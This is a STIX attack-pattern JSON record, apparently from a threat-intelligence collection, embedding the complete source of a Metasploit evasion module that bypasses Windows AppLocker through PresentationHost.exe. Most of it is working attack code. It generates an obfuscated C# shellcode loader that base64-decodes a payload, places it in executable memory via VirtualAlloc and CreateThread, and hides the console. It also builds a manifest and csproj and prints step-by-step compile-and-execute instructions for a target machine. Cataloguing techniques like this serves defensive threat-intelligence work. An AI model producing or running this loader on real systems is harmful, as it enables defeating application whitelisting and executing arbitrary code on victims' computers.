{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57f23dca-e8e5-4042-930e-278d29189741",
    "created": "2024-08-14T16:33:19.189656Z",
    "modified": "2024-08-14T16:33:19.18966Z",
    "name": "Applocker Evasion - Windows Presentation Foundation Host",
    "description": "( This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies. This technique utilises the Microsoft signed binary PresentationHost.exe to execute user supplied code. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/applocker_evasion_presentationhost.rb",
            "external_id": "applocker_evasion_presentationhost.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Applocker Evasion - Windows Presentation Foundation Host',\n      'Description' => %(\n         This module will assist you in evading Microsoft\n         Windows Applocker and Software Restriction Policies.\n         This technique utilises the Microsoft signed binary\n         PresentationHost.exe to execute user supplied code.\n                        ),\n      'Author'      =>\n        [\n          'Nick Tyrer <@NickTyrer>', # module development\n          'Casey Smith' # presentationhost bypass research\n        ],\n      'License'     => 'MSF_LICENSE',\n      'Platform'    => 'win',\n      'Arch'        => [ARCH_X86],\n      'Targets'     => [['Microsoft Windows', {}]])\n    )\n\n    register_options(\n      [\n        OptString.new('CS_FILE', [true, 'Filename for the .xaml.cs file (default: presentationhost.xaml.cs)', 'presentationhost.xaml.cs']),\n        OptString.new('MANIFEST_FILE', [true, 'Filename for the .manifest file (default: presentationhost.manifest)', 'presentationhost.manifest']),\n        OptString.new('CSPROJ_FILE', [true, 'Filename for the .csproj file (default: presentationhost.csproj)', 'presentationhost.csproj'])\n      ]\n    )\n\n    deregister_options('FILENAME')\n  end\n\n  def build_payload\n    Rex::Text.encode_base64(payload.encoded)\n  end\n\n  def obfu\n    Rex::Text.rand_text_alpha 8\n  end\n\n  def presentationhost_xaml_cs\n    esc = build_payload\n    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]\n    <<~HEREDOC\n      using System;\n      class #{mod[0]}{\n      static void Main(string[] args){\n      IntPtr #{mod[1]};\n      #{mod[1]} = GetConsoleWindow();\n      ShowWindow(#{mod[1]}, #{mod[2]});\n      string #{mod[3]} = \"#{esc}\";\n      byte[] #{mod[4]} = Convert.FromBase64String(#{mod[3]});\n      byte[] #{mod[5]} = #{mod[4]};\n      IntPtr #{mod[6]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[5]}.Length, #{mod[7]}, #{mod[8]});\n      System.Runtime.InteropServices.Marshal.Copy(#{mod[5]}, 0, #{mod[6]}, #{mod[5]}.Length);\n      IntPtr #{mod[9]} = IntPtr.Zero;\n      WaitForSingleObject(CreateThread(#{mod[9]}, UIntPtr.Zero, #{mod[6]}, #{mod[9]}, 0, ref #{mod[9]}), #{mod[10]});}\n      private static Int32 #{mod[7]}=0x1000;\n      private static IntPtr #{mod[8]}=(IntPtr)0x40;\n      private static UInt32 #{mod[10]} = 0xFFFFFFFF;\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);\n      [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n      static extern bool ShowWindow(IntPtr #{mod[1]}, int nCmdShow);\n      [System.Runtime.InteropServices.DllImport(\"Kernel32\")]\n      private static extern IntPtr GetConsoleWindow();\n      const int #{mod[2]} = 0;}\n    HEREDOC\n  end\n\n  def presentationhost_manifest\n    <<~HEREDOC\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n      <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" />\n      <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n      <applicationRequestMinimum>\n      <defaultAssemblyRequest permissionSetReference=\"Custom\" />\n      <PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" ID=\"Custom\" SameSite=\"site\" Unrestricted=\"true\" />\n      </applicationRequestMinimum>\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n      <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />\n      </requestedPrivileges>\n      </security>\n      </trustInfo>\n      </assembly>\n    HEREDOC\n  end\n\n  def presentationhost_csproj\n    <<~HEREDOC\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n      <Import Project=\"$(MSBuildExtensionsPath)\\\\$(MSBuildToolsVersion)\\\\Microsoft.Common.props\" Condition=\"Exists('$(MSBuildExtensionsPath)\\\\$(MSBuildToolsVersion)\\\\Microsoft.Common.props')\" />\n      <PropertyGroup>\n      <Configuration Condition=\" '$(Configuration)' == '' \">Release</Configuration>\n      <Platform Condition=\" '$(Platform)' == '' \">x86</Platform>\n      <OutputType>WinExe</OutputType>\n      <HostInBrowser>true</HostInBrowser>\n      <GenerateManifests>true</GenerateManifests>\n      <SignManifests>false</SignManifests>\n      </PropertyGroup>\n      <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Release|x86' \">\n      <Optimize>true</Optimize>\n      <OutputPath>.</OutputPath>\n      </PropertyGroup>\n      <ItemGroup>\n      <Reference Include=\"System\" />\n      </ItemGroup>\n      <ItemGroup>\n      <Compile Include=\"#{datastore['CS_FILE']}\">\n      <DependentUpon>#{datastore['CS_FILE']}</DependentUpon>\n      <SubType>Code</SubType>\n      </Compile>\n      </ItemGroup>\n      <ItemGroup>\n      <None Include=\"#{datastore['MANIFEST_FILE']}\" />\n      </ItemGroup>\n      <Import Project=\"$(MSBuildToolsPath)\\\\Microsoft.CSharp.targets\" />\n      </Project>\n    HEREDOC\n  end\n\n  def file_format_filename(name = '')\n    name.empty? ? @fname : @fname = name\n  end\n\n  def create_files\n    f1 = datastore['CS_FILE'].empty? ? 'presentationhost.xaml.cs' : datastore['CS_FILE']\n    f1 << '.xaml.cs' unless f1.downcase.end_with?('.xaml.cs')\n    f2 = datastore['MANIFEST_FILE'].empty? ? 'presentationhost.manifest' : datastore['MANIFEST_FILE']\n    f2 << '.manifest' unless f2.downcase.end_with?('.manifest')\n    f3 = datastore['CSPROJ_FILE'].empty? ? 'presentationhost.csproj' : datastore['CSPROJ_FILE']\n    f3 << '.csproj' unless f3.downcase.end_with?('.csproj')\n    cs_file = presentationhost_xaml_cs\n    manifest_file = presentationhost_manifest\n    csproj_file = presentationhost_csproj\n    file_format_filename(f1)\n    file_create(cs_file)\n    file_format_filename(f2)\n    file_create(manifest_file)\n    file_format_filename(f3)\n    file_create(csproj_file)\n  end\n\n  def instructions\n    print_status \"Copy #{datastore['CS_FILE']}, #{datastore['MANIFEST_FILE']} and #{datastore['CSPROJ_FILE']} to the target\"\n    print_status \"Compile using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\[.NET Version]\\\\MSBuild.exe #{datastore['CSPROJ_FILE']}\"\n    print_status \"Execute using: C:\\\\Windows\\\\System32\\\\PresentationHost.exe [Full Path To] #{datastore['CS_FILE'].gsub('.xaml.cs', '.xbap')}\"\n  end\n\n  def run\n    create_files\n    instructions\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}